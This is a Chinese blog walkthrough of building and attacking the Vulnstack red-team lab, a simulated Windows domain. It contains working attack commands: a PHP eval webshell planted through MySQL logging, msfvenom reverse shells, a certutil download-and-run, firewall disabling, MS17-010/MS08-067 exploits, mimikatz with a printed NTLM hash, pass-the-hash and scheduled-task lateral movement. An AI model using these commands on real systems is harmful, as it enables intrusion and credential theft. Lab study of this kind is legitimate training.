---
title: ATK&CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程
categories:
  - 实战靶场
tags:
  - 红队评估
  - ATK&CK
  - vulnstack
  - 域渗透
  - 内网渗透
author: Chace
toc: false
date: 2020-09-28 10:59:07
---

# ATK&CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程

## 0x01 前言
本靶机环境是红日团队开源的一个红队实战测试环境，靶机下载地址如下：

```
http://vulnstack.qiyuanxuetang.net/vuln/detail/2/
```

通过模拟真实环境搭建的漏洞靶场，完全模拟ATK&CK攻击链路进行搭建，形成完整个闭环。虚拟机默认密码为hongrisec@2019。

<!--more-->

## 0x02 环境搭建

本次环境搭建和靶机默认有些区别，我是在一台服务器的虚拟机上搭建的，服务器资源足够，为了避免运行卡顿，攻击机Kali也是在虚拟机上，具体配置如下，Kali虚拟机、WEB服务器win7外网网卡和宿主机桥接，和办公终端都是连到同一个局域网中。

WEB服务器：windows7系统

```
外网网卡IP：192.168.1.102
内网网卡IP：192.168.52.143
```

域成员：windows server 2003系统

```
网卡IP:192.168.52.141
```

域控服务器：windows server 2008系统

```
网卡IP：192.168.52.138
```

攻击机器：kali 2020.2

```
kali IP:192.168.1.101
```

宿主机IP：windows server 2008系统

```
IP:192.168.1.111
```

安装CobaltStrike服务器

```
IP：192.168.1.236
```

搭建靶机环境拓扑图如下：

![ATT&CK红队评估实战靶场（一）拓扑环境](1.png)



模拟攻击示意图如下：

![模拟攻击过程](2.png)

## 0x03 攻入内网

### 3.1. 信息收集

#### 3.1.1 主机探测

`netdiscover -i eth0 -r 192.168.1.0/24`

![](3.png)



#### 3.1.2 端口扫描

发现IP192.168.1.102，使用nmap探测端口开放情况（注意需要现在win7主机运行PhpStudy）

`nmap -sC -v -n -sV -Pn -p 1-65535 192.168.1.102`

![](4.png)

发现80端口开启，访问页面`http://192.168.1.102/`发现页面如下，存在大量信息泄露，收集有效信息。

![](5.png)

#### 3.1.3 目录扫描

使用7kbscan-WebPathBrute目录扫描工具开展漏洞扫描

![](6.png)

发现网站备份文件和phpadmin后台管理界面

![](7.png)

打开备份文件发现网站源码，打开robots.txt发现网站CMS为yxcms，访问`http://192.168.1.102/yxcms`进入网站首页

![](8.png)

### 3.2. 漏洞利用

#### 3.2.1 漏洞发现

##### 3.2.1.1 漏洞一：信息泄露+弱口令

网站泄露后台地址和用户密码，且用户密码为弱口令

![](9.png)

成功登录网站后台界面

![](10.png)

##### 3.2.1.2  漏洞二：PhpMyAdmin弱口令

发现使用默认用户名/口令（root/root）成功登录PhpMyAdmin管理页面

![](11.png)

##### 3.2.1.3  漏洞三：yxcms留言本XSS存储型漏洞

前台提交带有XSS代码的留言

![](12.png)

后台审核成功弹出XSS弹窗

![](13.png)

审核通过之后，前台同样成功弹窗

![](14.png)

可通过该漏洞获取管理员cookie或者诱导管理员点击执行某恶意代码

##### 3.2.1.4  漏洞四：yxcms后台任意文件读写漏洞

在后台创建新模板模块创建内容为一句话的新模板

![](15.png)

通过前面的备份文件可知文件保存的目录`http://192.168.1.102/yxcms/protected/apps/default/view/default/hack.php`

![](16.png)

使用蚁剑成功连接shell

![](17.png)

##### 3.2.1.5  漏洞五：yxcms后台SQL注入漏洞

在后台的碎片列表中进行删除操作，删除碎片ID可能存在盲注漏洞，使用dnslog获取SQL注入得到数据。

*yxcms漏洞代码原理解析参考文章`https://www.freebuf.com/column/162886.html`*

##### 3.2.1.6  漏洞六：PhpMyAdmin开启全局日志getshell

首先测试是否可以使用select into outfile直接写入

```sql
Select '<?php eval($_POST[hack]);?> ' into outfile 'C:/phpStudy/WWW/hack.php'
```

![](18.png)

写入失败， `show global variables like ‘%secure%’`查看变量secure-file-priv  值为NULL，且为只读无法修改。

尝试使用全局日志写入shell，查看全局变量general_log：`show global variables like ‘%general_%’`

![](19.png)

开启全局日志并修改日志保存位置为C:/phpStudy/WWW/hack.php

```sql
set global general_log=on;
set global general_log_file='C:/phpStudy/WWW/hack.php';
```



![](20.png)

查询一句话写入日志`Select '<?php eval($_POST[hack]);?>'`

![](21.png)

使用蚁剑连接一句话木马`http://192.168.1.102/hack.php`

![](22.png)

### 3.3 CS上线GetShell

CS客户端服务端都部署在192.168.1.236主机上，创建监听并生成powershell

![](23.png)

时间反应比较慢，建议多执行几次并等一会

提权成功

![](24.png)

### 3.4 系统信息收集

查看网卡

![](25.png)

![](26.png)

发现内网ip地址192.168.52.143和域god.org，查看域信息

```
net group /domain  #查看域内所有用户列表
net group “domain computers” /domain #查看域成员计算机列表
net group “domain admins” /domain #查看域管理员用户
```

![](27.png)

![](28.png)

本机计算机名字为STU1，另外还有两个域用户分别是DEV1、ROOT-TVI862UBEH、域控制用户为OWA

### 3.5 主机密码收集

获取系统用户名和密码

![](29.png)

### 3.6 远程桌面登录

远程开启3389端口并关闭防火墙

````
注册表开启3389端口
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f


关闭防火墙
netsh firewall set opmode disable   			#winsows server 2003 之前
netsh advfirewall set allprofiles state off 	#winsows server 2003 之后

````

![](30.png)

这个时候防火墙是开启，我们需要关闭防火墙，使用域用户god\administrator/hongrisec@2020成功登录这一台win7WEB主机

![](31.png)

## 0x04 内网信息收集

### 4.1 域信息收集

前面收集到的信息Win7计算机名字为STU1，另外还有两个域用户分别是DEV1、ROOT-TVI862UBEH、域控制用户为OWA

win7内网的IP地址为192.168.52.143

进一步开始收集，通过Ladon 192.168.52.0/24 OnlinePC探测域内存活主机

![](32.png)

域成员：192.168.52.141

域控DC：192.168.52.138

### 4.5 内网漏洞扫描

前期我们获取到win7的远程桌面也可以通过远程发现win7主机上安装了nmap工具，我们可以进一步针对192.168.52.0/24内网网段进行漏洞信息收集
![](33.png)

```
nmap  --script-vlun -p 1-65535 192.168.52.141
```
![](34.png)
```
nmap  --script-vlun -p 1-65535 192.168.52.138
```

![](35.png)

也可以自己上传工具开展信息漏洞收集工作，我们使用上传的Ladon工具

![](36.png)



发现192.168.1.141存在漏洞：MS08-067、MS17-010，192.168.1.138存在MS17-010漏洞。

攻击思路：

1、我们可以直接全部使用MS17-010获取域成员和域控主机；

2、使用MS08-067获取域成员主机，然后使用横向移动【VMI利用】获取域控主机



## 0x05 横向渗透

### 5.1 MSF反弹shell

这里我们使用Kali的msf先反弹一个shell

```
#生成反弹shell文件
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=4444 -f raw > shell.php

#在本机中设置监听

msfconsloe
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.1.101
set lport 4444
run
```

然后使用蚁剑上传shell.php，并访问

![](37.png)

![](38.png)

### 5.2 内网流量转发(MSF+proxychains)

*参考文章`https://www.freebuf.com/articles/network/125278.html`*

成功获取msf反弹shell，添加路由到目标环境网络，使得msf能够通过win7路由转发访问192.168.25.0/24网段

```
#查看路由信息
run get_local_subnets
#添加一条路由
run autoroute -s 192.168.52.0/24
```

![](39.png)

使用msf的socks4代理模块

![](40.png)

文本编辑器修改`etc/proxychains.conf`，在最后一行加上socks4代理服务器

```
[ProxyList]

socks4 192.168.1.101 1080
```

使用proxychains代理nmap扫描主机

![](41.png)

### 5.3 MS08-067 搭配Bind TCP

由于没有定义双向路由，目标系统无法直接连接到攻击机，所以我们需要将Bind_tcp设置为payload类型，在exploit操作成功之后，就要对连接到目标系统的端口进行监听，两者区别如下：

![](42.png)

完整设置如下：

![](43.png)

成功获取域成员192.168.1.141的shell

![](44.png)

###　5.4 MS17-010获取域控服务器

我们同样可以使用MS17-010获取域服务器和域控服务器权限，这里我们直接攻击域控服务器

使用`exploit/windows/smb/ms17_010_eternalblue`攻击流程如下：

![](45.png)

![](46.png)

获取失败，使用

```
use exploit/windows/smb/ms17_010_psexec
set payload windows/meterpreter/blind_tcp
```

攻击流程如下

![](47.png)

仍然无法有效获取会话

### 5.5 WMI获取域控服务器

上传vmiexec.vbs到192.168.52.143（win7）机器上，然后执行

```
cscript.exe vmiexec.vbs /cmd 192.168.52.138 administrator hongrisec@2020 "whoami"
```

或者直接使用之前上传的Ladom工具执行`ladom wmiexec 192.168.52.138 administrator hongrisec@2020 whoami`

![](48.png)

同上面的过程一样，我们需要获取一个正向的msf连接，过程如下：

首先生成一个正向的exe文件放到win7的网站目录上

![](49.png)

在win7上查看

![](50.png)

在win7上使用WMI执行命令`certutil.exe -urlcache -split -f http://192.168.52.143/6666.exe&6666.exe`

![](51.png)

成功执行，这时候在138机器（DC—win2008）上开启6666端口监听

然后我们在msf上个运行blin_tcp来获取回话

![](52.png)

忘记改端口了，修改端口为6666

![](53.png)

成功获取域控权限，后续提权，可以使用msf mimikatz进一步获取用户密码等。（msf连接过程中保持内网流量转发：步骤5.2，如果无法获取会话在kali上扫描138主机6666端口是否开放，如果没有开放参考3.6，同样使用vmi命令关闭防火墙后重，我使用的是之前上传的K8大神的Lodan工具，是因为vbs脚本一直没有回显，后来重启win2008域控服务器才有回显）

![img](54.png)



下一步开始提权，尝试多种提权方法均失败

![img](55.png)

然后上网查看资料，使用CVE-2018-8120来提权，直接文件上传upload CVE-2018-8120-master提权程序
![img](56.png)


成功提权，上免杀mimikatz

![img](57.png)

用户所有密码都会保存在mz.log文件中，可以直接type mz.log查看

![img](58.png)

### 5.6 票据加计划任务获取DC

> 这是博客[ATT&CK红队评估实战靶场(一)](https://www.cnblogs.com/Ekko-z/p/12991730.html)的获取域控方法，感觉太过复杂，本人没有尝试，这里也放在这里供大家参考。
>

mimikatz sekurlsa::pth /domain:god.org /user:administrator /ntlm:81be2f80d568100549beac645d6a7141
![img](59.png)
shell dir \192.168.52.138\c$ //dir DC的目录
![img](60.png)
生成一个exe马
这里用windows/reverse_bind_tcp LHOST=0.0.0.0 LPORT=7777 生成正向的马 yukong.exe
把马复制到域控机器上shell copy C:\yukong.exe \192.168.52.138\c$
然后再用这个写入计划任务的方法去连接，这里马反弹会连不成功，所以
shell schtasks /create /tn "test" /tr C:\yukong.exe /sc once /st 22:14 /S 192.168.52.138 /RU System /u administrator /p "hongrisec@2020"
挂着win7代理 proxy nc -vv 192.168.52.138 7777 即可弹回DC138的shell
用Meterpreter的马也可以，之前失败了，后续还是改成meterpreter的马，或者把普通shell再升级成meterpreter再导入cs也可以
马上线之后清除计划任务schtasks /delete /s 192.168.52.138 /tn "test" /f

## 0x06 后记

当然最后获取域控权限的方法还有好多，向pth攻击、横向哈希传递、redis等等，还有后续的痕迹清理日志清楚都没有涉及，经过这一次充分认识到自己的不足，还需要多加学习，有些地方自己还是没有完全弄明白，只是完全参考网络上的大神们的教程，文中有错漏的地方希望大家多多包含，我只是用了我觉得最简单的思路进行攻击，更复杂的没有涉及，希望以后能多多练习这样的靶机学习更牛的技能，最后谢谢红日团队给出的这个靶机，后续还有一系列靶机，有时间会慢慢逐个尝试。

## 0x07 参考资料

[ATT&CK实战 | Vulnstack 红队（一）](https://www.freebuf.com/column/231111.html)

[ATT&CK实战 | 红队评估一(上)](https://www.freebuf.com/articles/web/230476.html)

[ATT&CK实战 | 红队评估一(下)](https://www.freebuf.com/articles/web/230725.html)

[ATT&CK红队评估实战靶场(一)](https://www.cnblogs.com/Ekko-z/p/12991730.html)

[图解Meterpreter实现网络穿透的方法](https://www.freebuf.com/articles/network/125278.html)

[内网渗透靶机-VulnStack 1](https://cloud.tencent.com/developer/article/1633420)

[代码审计| yxcms app 1.4.6 漏洞集合](https://www.freebuf.com/column/162886.html)

[从外网到域控（vulnstack靶机实战）](https://www.anquanke.com/post/id/189940)